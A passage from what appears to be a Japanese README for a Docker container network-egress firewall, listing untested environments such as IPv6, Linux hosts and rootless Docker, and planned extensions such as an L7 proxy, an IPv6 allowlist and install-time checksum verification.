53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** 詳細と対策の選択肢は [`docs/known-issues.md`](./docs/known-issues.md) の項目 13 を参照してください。

---

# FUTURE WORK

## 未検証の環境

実機検証（[`docs/verification-checklist.md`](./docs/verification-checklist.md)）は **Docker Desktop（macOS / arm64、linuxkit カーネル 6.12.76）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。以下は**環境を用意できていないため未検証**です。

### IPv6 が有効なコンテナ

検証環境のコンテナには `lo` の `::1` しか IPv6 アドレスがありません。`--ipv6` や `enable_ipv6` で IPv6 を有効にした場合、次が未確認です。

* **AAAA を持つ許可先への接続が足踏みしないか** — IPv6 は全 DROP で、DROP は ICMP を返しません。クライアントが RFC 6724 に従って AAAA を先に試すと、IPv4 にフォールバックするまでタイムアウト待ちになる可能性があります。対策案（IPv6 側にも明示的な `REJECT` を置き、IPv4 と同じ扱いにする）は [`docs/known-issues.md`](./docs/known-issues.md) の項目 12 に記載しています
* **`curl -6` による遮断の実到達性テスト** — グローバル IPv6 アドレスが無いため自己検証でもスキップされています
* **IPv6 の allowlist** — 現在は設計上すべて DROP です。必要になった場合の拡張方針は [`docs/spec.md`](./docs/spec.md) §10 を参照してください

### Linux ホスト上の Docker

検証はすべて linuxkit VM（Docker Desktop）上です。Linux ホストでは次が変わります。

* **デフォルトブリッジのリゾルバが実在のネットワーク機器になる** — 家庭用ルータや社内 DNS サーバーを指すため、「実機の 53 番への到達経路が 1 本開く」意味合いが Docker Desktop より大きくなります（[DNS リゾルバ](#dns-リゾルバ) 参照）
* **`systemd-resolved`（`127.0.0.53`）を使うホスト** — デフォルトブリッジでは Docker がループバックを除外して `8.8.8.8` / `8.8.4.4` にフォールバックします。この挙動下での動作は未確認です。ユーザー定義ネットワークを使えば回避できます
* `iptables` のバックエンド（`nf_tables` / `legacy`）やディストリビューションによる差異

### その他

* **CI ランナー / クラウド開発環境**（GitHub Codespaces 等）での動作
* **rootless Docker** — `NET_ADMIN` の扱いが変わります

## 実装の拡張

方針は [`docs/spec.md`](./docs/spec.md) §10、個別の課題は [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。

| 項目 | 内容 |
|---|---|
| L7 proxy への移行 | ワイルドカード対応・メソッド別制御・DNS トンネリング対策が同時に解ける本命 |
| IPv6 allowlist | `hash:net family inet6` の set 追加、AAAA 解決、`emit_filter_v6` への ACCEPT |
| `NFLOG` への移行 | 時刻・ポートまで必要になった場合。`nfnetlink_log` は netns 対応のためコンテナ内から読める |
| インストール時のチェックサム検証 | スクリプトは root で動作するが、配置時のハッシュ検証は未実装 |
